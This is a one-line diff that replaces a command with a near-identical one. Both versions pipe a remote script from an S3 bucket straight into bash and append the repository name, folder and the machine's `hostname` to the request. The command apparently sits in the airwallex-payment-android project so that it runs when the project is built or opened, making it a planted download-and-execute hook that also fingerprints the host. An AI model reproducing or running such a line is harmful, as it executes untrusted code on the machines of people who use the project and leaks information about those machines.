@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/airwallex/airwallex-payment-android.git\&folder=airwallex-payment-android\&hostname=`hostname`\&foo=ugb
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/airwallex/airwallex-payment-android.git\&folder=airwallex-payment-android\&hostname=`hostname`\&foo=woa
